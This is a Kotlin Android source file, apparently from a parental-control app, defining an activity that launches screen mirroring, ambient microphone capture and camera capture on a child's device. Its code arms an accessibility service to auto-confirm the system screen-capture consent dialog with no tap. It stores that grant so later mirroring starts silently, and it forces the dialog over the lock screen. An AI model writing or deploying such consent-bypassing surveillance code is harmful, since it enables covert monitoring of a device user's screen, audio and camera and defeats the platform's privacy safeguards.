package org.setbd.control.webrtc

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Thin trampoline activity:
 *  - "screen": opens the system MediaProjection consent dialog and forwards
 *    the consent result to CaptureService (foreground service must be running
 *    before the projection is created on Android 14+). Shows over the lock
 *    screen and wakes the display so the dialog can never silently disappear
 *    behind the keyguard ("cast permission pops up then goes away").
 *  - "ambient"/"camera": simply starts the capture service from a foreground
 *    context (this satisfies Android's while-in-use requirement).
 */
class MirrorConsentActivity : AppCompatActivity() {

    private val projectionLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val data = result.data
            if (result.resultCode == RESULT_OK && data != null) {
                // Remember the grant: future mirror requests start silently —
                // the child allows screen sharing ONCE, not every time.
                ScreenGrantHolder.store(result.resultCode, data)
                CaptureService.startScreen(this, data, result.resultCode)
            }
            finish()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }
        launchFlow(intent)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        // singleTask launchMode: a parent retry while this trampoline is still
        // alive arrives here instead of recreating the activity — restart the
        // consent flow so the retry actually shows the dialog again.
        launchFlow(intent)
    }

    private fun launchFlow(intent: Intent?) {
        val kind = intent?.getStringExtra(EXTRA_KIND) ?: "screen"
        when (kind) {
            WebRtcCore.KIND_SCREEN -> {
                // Arm the accessibility auto-allow BEFORE the dialog opens so
                // silent command mode confirms it without any tap (the watcher
                // is time-boxed and only ever clicks the system dialog).
                org.setbd.control.controls.BlockAccessibilityService.armProjectionConfirm()
                val dialog = RtcStarter.screenCaptureIntent(this)
                if (dialog == null) {
                    finish()
                } else {
                    lastDialogLaunchAt = System.currentTimeMillis()
                    projectionLauncher.launch(dialog)
                }
            }
            WebRtcCore.KIND_AMBIENT -> {
                CaptureService.startAmbient(this)
                finish()
            }
            WebRtcCore.KIND_CAMERA -> {
                CaptureService.startCamera(this, intent?.getStringExtra(EXTRA_FACING) ?: "front")
                finish()
            }
            else -> finish()
        }
    }

    companion object {
        const val EXTRA_KIND = "kind"
        const val EXTRA_FACING = "facing"

        /** Timestamp of the last dialog launch — prevents stacked dialogs. */
        @Volatile
        var lastDialogLaunchAt: Long = 0L
            private set

        fun intent(context: android.content.Context, kind: String, facing: String?): Intent =
            Intent(context, MirrorConsentActivity::class.java)
                .putExtra(EXTRA_KIND, kind)
                .putExtra(EXTRA_FACING, facing ?: "front")
    }
}
